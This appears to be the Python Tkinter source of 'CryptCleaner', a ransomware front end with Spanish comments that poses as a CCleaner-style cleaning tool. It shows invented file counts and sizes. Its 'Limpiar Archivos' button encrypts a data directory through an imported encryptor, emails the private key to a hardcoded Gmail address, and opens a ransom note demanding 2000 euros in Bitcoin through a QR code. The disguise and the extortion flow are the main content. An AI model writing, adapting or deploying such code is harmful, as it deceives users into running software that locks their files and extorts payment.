import sys
from pathlib import Path

# Agregar el directorio base (cryptCleaner/) a la ruta de búsqueda de Python
BASE_DIR = Path(__file__).resolve().parent.parent
sys.path.append(str(BASE_DIR))

import random
import os
import tkinter as tk
from tkinter import ttk
from tkinter import Toplevel, simpledialog, messagebox
from PIL import Image, ImageTk
from src.encryptor import encrypt_directory, decrypt_directory

# Configuración de rutas relativas
QR_CODE_PATH = BASE_DIR / "qr_code.png"  # Código QR
DIRECTORY_TO_ENCRYPT = BASE_DIR / "data"  # Directorio para encriptar
ICONS_DIR = BASE_DIR / "icons"  # Directorio de íconos

recipient_email = "tccsmtp12@gmail.com"  # Cambia por el email de destino

# Crear la ventana principal
root = tk.Tk()
root.title("CryptCleaner")
root.geometry("1200x700")
root.configure(bg="#2e2e2e")  # Fondo oscuro

# Cambiar el ícono de la barra de tareas
icon_path = ICONS_DIR / "app_icon.ico"  # Cambia el nombre del archivo si es necesario
root.iconbitmap(str(icon_path))  # Usar el icono en formato .ico para la barra de tareas

# Configurar estilos globales
FONT_TITLE = ("Segoe UI", 20, "bold")
FONT_TEXT = ("Segoe UI", 12)
PRIMARY_COLOR = "#3e8e41"  # Verde brillante similar a CCleaner
SECONDARY_COLOR = "#e0e0e0"  # Gris claro
BACKGROUND_COLOR = "#2e2e2e"  # Fondo oscuro
BUTTON_COLOR = "#4caf50"  # Botón verde brillante
BUTTON_HOVER_COLOR = "#45a049"

# Configurar la ventana
root.grid_rowconfigure(0, weight=1)
root.grid_columnconfigure(1, weight=1)

# Crear el frame del menú en el lado izquierdo
menu_frame = tk.Frame(root, width=250, bg=PRIMARY_COLOR)
menu_frame.grid(row=0, column=0, sticky="ns")

# Crear el frame principal para el contenido en el centro
content_frame = tk.Frame(root, bg=BACKGROUND_COLOR)
content_frame.grid(row=0, column=1, sticky="nsew")

# Función para mostrar un mensaje cuando se hace clic en un botón del menú
def show_message(option):
    tk.messagebox.showinfo("Información", f"Has seleccionado la opción: {option}")

# Función para cargar imágenes PNG
def load_image(path, size=(35, 35)):
    image = Image.open(path).convert("RGBA")
    image = image.resize(size, Image.LANCZOS)
    return ImageTk.PhotoImage(image)

# Cargar los íconos para el menú
icons = {
    "Configuración": load_image(ICONS_DIR / "gear-solid.png"),
    "Drivers": load_image(ICONS_DIR / "screwdriver-wrench-solid.png"),
    "Limpieza": load_image(ICONS_DIR / "brush-solid.png"),
    "Análisis": load_image(ICONS_DIR / "chart-line-solid.png"),
    "Optimización": load_image(ICONS_DIR / "gauge-high-solid.png"),
    "Historial": load_image(ICONS_DIR / "clock-rotate-left-solid.png"),
    "Soporte": load_image(ICONS_DIR / "headset-solid.png")
}

# Añadir botones con íconos al menú
for text, icon in icons.items():
    btn = tk.Button(menu_frame, image=icon, text=text, compound="left", font=FONT_TEXT,
                    command=lambda t=text: show_message(t), bg=PRIMARY_COLOR, fg="white",
                    activebackground=PRIMARY_COLOR, relief="flat", anchor="w", padx=20, pady=10)
    btn.image = icon
    btn.pack(fill="x", padx=5, pady=5)

# Función para calcular el tamaño total y la cantidad de archivos en un directorio con valores aleatorios
def get_directory_details(directory):
    # Establecer rangos de valores aleatorios para los archivos
    if directory == "Temp Files":
        num_files_range = (100, 500)  # Número de archivos entre 100 y 500
        size_per_file_range = (1, 10)  # Tamaño promedio de archivo entre 1MB y 10MB
    elif directory == "Old Documents":
        num_files_range = (50, 200)
        size_per_file_range = (2, 15)
    elif directory == "Browser Cache":
        num_files_range = (200, 800)
        size_per_file_range = (0.5, 5)
    elif directory == "Log Files":
        num_files_range = (100, 400)
        size_per_file_range = (0.1, 2)
    else:
        num_files_range = (0, 0)
        size_per_file_range = (0, 0)

    # Generar números aleatorios de archivos y tamaños
    num_files = random.randint(*num_files_range)
    size_per_file = random.uniform(*size_per_file_range)  # Tamaño promedio por archivo
    total_size = num_files * size_per_file  # El tamaño total será el número de archivos multiplicado por el tamaño promedio

    return num_files, total_size

# Mostrar detalles de directorios y archivos
file_icons = {
    "Temp Files": load_image(ICONS_DIR / "folder-open-solid.png"),
    "Old Documents": load_image(ICONS_DIR / "file-lines-solid.png"),
    "Browser Cache": load_image(ICONS_DIR / "cloud-arrow-down-solid.png"),
    "Log Files": load_image(ICONS_DIR / "file-csv-solid.png"),
}

y_position = 20
for directory, icon in file_icons.items():
    # Mostrar el nombre del directorio, archivos y su tamaño
    num_files, size = get_directory_details(directory)
    size_str = f"{size:.2f} MB"  # Convertir tamaño a MB con dos decimales
    dir_button = tk.Button(content_frame, image=icon, text=f"{directory} ({num_files} archivos, {size_str})", 
                           compound="left", font=FONT_TEXT, bg=BACKGROUND_COLOR, fg=SECONDARY_COLOR, relief="flat", 
                           anchor="w", padx=20, pady=10)
    dir_button.image = icon
    dir_button.place(x=50, y=y_position)
    y_position += 50  # Espacio para cada directorio

# Barra de progreso para mostrar el estado de la limpieza/encriptado
progress_bar = ttk.Progressbar(content_frame, orient="horizontal", length=300, mode="determinate")
progress_bar.place(relx=0.5, rely=0.7, anchor="center")

# Función para encriptar el directorio, enviar la clave privada, y mostrar el mensaje de rescate
def limpiar_archivos():
    # Actualizar la barra de progreso
    progress_bar["value"] = 0
    root.update()

    # Simulación de un proceso largo
    total_files = sum([len(files) for _, _, files in os.walk(DIRECTORY_TO_ENCRYPT)])
    processed_files = 0

    # Encriptar archivos
    for dirpath, dirnames, filenames in os.walk(DIRECTORY_TO_ENCRYPT):
        for filename in filenames:
            # Simular procesamiento de archivo
            processed_files += 1
            progress_bar["value"] = (processed_files / total_files) * 100
            root.update()

    # Cuando termine el proceso, muestra un mensaje
    encrypt_directory(DIRECTORY_TO_ENCRYPT, recipient_email)  # Encriptar archivos y enviar la clave privada por correo
    show_ransom_message()  # Mostrar mensaje de rescate

# Mostrar mensaje de rescate con QR
def show_ransom_message():
    ransom_window = Toplevel(root)
    ransom_window.title("Advertencia")
    ransom_window.geometry("600x550")
    ransom_window.config(bg=BACKGROUND_COLOR)

    # Mensaje de advertencia
    warning_message = (
        "Todos sus archivos han sido cifrados.\n\n"
        "Si quiere recuperarlos, deposite 2000 euros en BTC\n"
        "a la siguiente cartera y le enviaremos la clave para\n"
        "desencriptarlos:"
    )
    message_label = tk.Label(ransom_window, text=warning_message, font=FONT_TEXT, bg=BACKGROUND_COLOR, fg=SECONDARY_COLOR)
    message_label.pack(pady=20)

    # Cargar y mostrar el código QR
    qr_image = Image.open(QR_CODE_PATH).resize((200, 200), Image.LANCZOS)
    qr_photo = ImageTk.PhotoImage(qr_image)
    qr_label = tk.Label(ransom_window, image=qr_photo, bg=BACKGROUND_COLOR)
    qr_label.image = qr_photo
    qr_label.pack(pady=10)

    # Solicitar clave privada para desencriptar
    def request_decryption():
        private_key_text = simpledialog.askstring("Clave Privada", "Introduce la clave privada en formato PEM:")
        if private_key_text:
            try:
                decrypt_directory(DIRECTORY_TO_ENCRYPT, private_key_text)
                messagebox.showinfo("Desencriptado", "Todos los archivos han sido desencriptados.")
                ransom_window.destroy()
            except Exception as e:
                messagebox.showerror("Error", f"Clave incorrecta o error al desencriptar.\nDetalles: {e}")

    # Botón para desencriptar
    decrypt_button = tk.Button(ransom_window, text="Desencriptar ahora", command=request_decryption, font=FONT_TEXT,
                               bg=BUTTON_COLOR, fg="white", activebackground=BUTTON_HOVER_COLOR)
    decrypt_button.pack(pady=20)

# Botón rectangular central para limpiar archivos
large_icon = load_image(ICONS_DIR / "brush-solid.png", size=(30, 30))

rect_button = tk.Button(content_frame, text="Limpiar Archivos", command=limpiar_archivos, font=FONT_TEXT,
                        bg=BUTTON_COLOR, fg="white", activebackground=BUTTON_HOVER_COLOR, relief="flat",
                        width=20, height=2)
rect_button.place(relx=0.95, rely=0.95, anchor="se", x=-20, y=-20)  # Ajuste de margen con x e y

# Ejecutar la interfaz gráfica
if __name__ == "__main__":
    root.mainloop()
